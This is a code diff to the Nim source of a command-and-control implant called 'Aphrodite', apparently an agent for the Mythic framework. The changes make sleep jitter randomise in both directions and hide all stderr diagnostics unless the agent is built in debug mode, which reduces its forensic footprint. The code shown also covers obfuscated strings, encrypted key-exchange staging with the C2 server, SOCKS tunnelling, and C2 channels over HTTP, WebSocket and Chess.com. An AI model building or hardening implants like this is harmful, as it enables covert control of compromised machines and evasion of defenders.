@@ -138,8 +138,9 @@ proc currentUUID(ag: AphroditeAgent): string =
 proc sleepWithJitter(ag: AphroditeAgent) =
   var ms = ag.state.sleepInterval * 1000
   if ag.state.jitter > 0:
-    let reduction = int(float(ms) * float(ag.state.jitter) / 100.0 * rand(1.0))
-    ms = max(100, ms - reduction)
+    let variation = int(float(ms) * float(ag.state.jitter) / 100.0 * rand(1.0))
+    let direction = if rand(1) == 0: -1 else: 1
+    ms = max(100, ms + direction * variation)
 
   when defined(windows) and defined(sleepObf):
     # Sleep obfuscation: XOR-encrypt AES key and callback ID during sleep to
@@ -184,14 +185,14 @@ proc makeSendMsg(ag: AphroditeAgent): SendMsg =
 proc setupPsk(ag: AphroditeAgent): bool =
   if AesPsk.len == 0:
     ag.aesKey = @[]
-    stderr.writeLine(hidstr("[*] No PSK configured — plaintext mode"))
+    when defined(debug): stderr.writeLine(hidstr("[*] No PSK configured — plaintext mode"))
     return true
   ag.aesKey = base64Key(AesPsk)
   if ag.aesKey.len != 32:
-    stderr.writeLine(hidstr("[!] Invalid PSK length — falling back to plaintext"))
+    when defined(debug): stderr.writeLine(hidstr("[!] Invalid PSK length — falling back to plaintext"))
     ag.aesKey = @[]
   else:
-    stderr.writeLine(hidstr("[*] PSK loaded (") & $ag.aesKey.len & hidstr(" bytes)"))
+    when defined(debug): stderr.writeLine(hidstr("[*] PSK loaded (") & $ag.aesKey.len & hidstr(" bytes)"))
   return true
 
 # ---------------------------------------------------------------------------
@@ -206,7 +207,7 @@ when defined(useEke):
     ## 3. Decrypt AES session key → use for all subsequent comms
     var ctx = ekaGenerate()
     if not ctx.ekaIsValid():
-      stderr.writeLine("[!] EKE: RSA key generation failed")
+      when defined(debug): stderr.writeLine("[!] EKE: RSA key generation failed")
       return false
 
     let sessionId = ekaSessionId()
@@ -215,13 +216,13 @@ when defined(useEke):
     let jsonBody = "{\"action\":\"" & hidstr("staging_rsa") & "\",\"pub_key\":\"" & pubB64 &
                    "\",\"session_id\":\"" & sessionId & "\"}"
 
-    stderr.writeLine(hidstr("[*] EKE: sending staging_rsa (RSA-2048)"))
+    when defined(debug): stderr.writeLine(hidstr("[*] EKE: sending staging_rsa (RSA-2048)"))
 
     ## Send encrypted with PSK (ag.aesKey set by setupPsk — empty = plaintext staging)
     let raw = ag.transport.post(ag.payloadUUID, ag.aesKey, jsonBody)
     if raw.len == 0:
       ctx.ekaFree()
-      stderr.writeLine(hidstr("[!] EKE: no response from server"))
+      when defined(debug): stderr.writeLine(hidstr("[!] EKE: no response from server"))
       return false
 
     var resp: JsonNode
@@ -229,7 +230,7 @@ when defined(useEke):
       resp = parseJson(raw)
     except:
       ctx.ekaFree()
-      stderr.writeLine(hidstr("[!] EKE: invalid JSON response"))
+      when defined(debug): stderr.writeLine(hidstr("[!] EKE: invalid JSON response"))
       return false
 
     let newUUID = resp{"uuid"}.getStr("")
@@ -238,11 +239,11 @@ when defined(useEke):
 
     if newUUID.len == 0 or encKey.len == 0:
       ctx.ekaFree()
-      stderr.writeLine(hidstr("[!] EKE: missing uuid or session_key in response"))
+      when defined(debug): stderr.writeLine(hidstr("[!] EKE: missing uuid or session_key in response"))
       return false
     if respSid != sessionId:
       ctx.ekaFree()
-      stderr.writeLine(hidstr("[!] EKE: session_id mismatch"))
+      when defined(debug): stderr.writeLine(hidstr("[!] EKE: session_id mismatch"))
       return false
 
     ## Decrypt AES session key with our RSA private key (PKCS#1 v1.5)
@@ -250,12 +251,12 @@ when defined(useEke):
     ctx.ekaFree()
 
     if aesKey.len != 32:
-      stderr.writeLine(hidstr("[!] EKE: decrypted key length wrong (") & $aesKey.len & hidstr(" bytes, expected 32)"))
+      when defined(debug): stderr.writeLine(hidstr("[!] EKE: decrypted key length wrong (") & $aesKey.len & hidstr(" bytes, expected 32)"))
       return false
 
     ag.mythicID = newUUID
     ag.aesKey   = aesKey
-    stderr.writeLine(hidstr("[+] EKE staging complete — staging UUID=") & newUUID)
+    when defined(debug): stderr.writeLine(hidstr("[+] EKE staging complete — staging UUID=") & newUUID)
     return true
 
 # ---------------------------------------------------------------------------
@@ -436,25 +437,25 @@ proc processSocksIn(socksArr: JsonNode): seq[JsonNode] =
   ## Process incoming socks datagrams from Mythic.
   result = @[]
   if socksArr.isNil or socksArr.kind != JArray: return
-  stderr.writeLine("[SOCKS] processSocksIn: " & $socksArr.len & " packets from Mythic")
+  when defined(debug): stderr.writeLine("[SOCKS] processSocksIn: " & $socksArr.len & " packets from Mythic")
   for item in socksArr:
     let serverId = item{"server_id"}.getInt(-1)
     let exit     = item{"exit"}.getBool(false)
     let rawData  = decode(item{"data"}.getStr(""))
-    stderr.writeLine("[SOCKS] <- Mythic server_id=" & $serverId & " exit=" & $exit & " data_len=" & $rawData.len)
+    when defined(debug): stderr.writeLine("[SOCKS] <- Mythic server_id=" & $serverId & " exit=" & $exit & " data_len=" & $rawData.len)
     for (sid, respData) in socksHandleData(serverId, rawData, exit):
-      stderr.writeLine("[SOCKS] -> queued reply " & $respData.len & " bytes for server_id=" & $sid)
+      when defined(debug): stderr.writeLine("[SOCKS] -> queued reply " & $respData.len & " bytes for server_id=" & $sid)
       result.add(%*{"server_id": sid, "data": encode(respData), "exit": false})
 
 proc collectSocksOut(): seq[JsonNode] =
   ## Drain buffered TCP→Mythic data from all active SOCKS connections.
   result = @[]
   for (sid, respData) in socksCollect():
-    stderr.writeLine("[SOCKS] -> Mythic " & $respData.len & " bytes server_id=" & $sid)
+    when defined(debug): stderr.writeLine("[SOCKS] -> Mythic " & $respData.len & " bytes server_id=" & $sid)
     result.add(%*{"server_id": sid, "data": encode(respData), "exit": false})
   ## Notify Mythic of closed connections
   for sid in socksCollectExits():
-    stderr.writeLine("[SOCKS] -> Mythic EXIT server_id=" & $sid)
+    when defined(debug): stderr.writeLine("[SOCKS] -> Mythic EXIT server_id=" & $sid)
     result.add(%*{"server_id": sid, "data": "", "exit": true})
 
 # ---------------------------------------------------------------------------
@@ -462,13 +463,13 @@ proc collectSocksOut(): seq[JsonNode] =
 # ---------------------------------------------------------------------------
 
 proc run*(ag: AphroditeAgent) =
-  stderr.writeLine(hidstr("[*] Aphrodite starting — UUID=") & ag.payloadUUID)
+  when defined(debug): stderr.writeLine(hidstr("[*] Aphrodite starting — UUID=") & ag.payloadUUID)
   when defined(c2ProfileWs):
-    stderr.writeLine(hidstr("[*] C2 (WS): ws://") & WsHost & ":" & $WsPort & "/" & WsPath)
+    when defined(debug): stderr.writeLine(hidstr("[*] C2 (WS): ws://") & WsHost & ":" & $WsPort & "/" & WsPath)
   elif defined(c2ProfileChesscom):
-    stderr.writeLine(hidstr("[*] C2 (Chess.com): collections / agent→serveur via Mythic chesscom"))
+    when defined(debug): stderr.writeLine(hidstr("[*] C2 (Chess.com): collections / agent→serveur via Mythic chesscom"))
   else:
-    stderr.writeLine(hidstr("[*] C2 (HTTP): ") & C2BaseUrl & C2Endpoint)
+    when defined(debug): stderr.writeLine(hidstr("[*] C2 (HTTP): ") & C2BaseUrl & C2Endpoint)
 
   var retries = 0
   while ag.state.running and retries < 10:
@@ -479,10 +480,10 @@ proc run*(ag: AphroditeAgent) =
     sleep(delay * 1000)
 
   if not ag.state.running or ag.mythicID.len == 0:
-    stderr.writeLine(hidstr("[!] Failed to check in after retries. Exiting."))
+    when defined(debug): stderr.writeLine(hidstr("[!] Failed to check in after retries. Exiting."))
     return
 
-  stderr.writeLine(hidstr("[+] Checkin OK — callback ID=") & ag.mythicID)
+  when defined(debug): stderr.writeLine(hidstr("[+] Checkin OK — callback ID=") & ag.mythicID)
 
   var pendingResponses: seq[JsonNode] = @[]
   var pendingSocks:     seq[JsonNode] = @[]
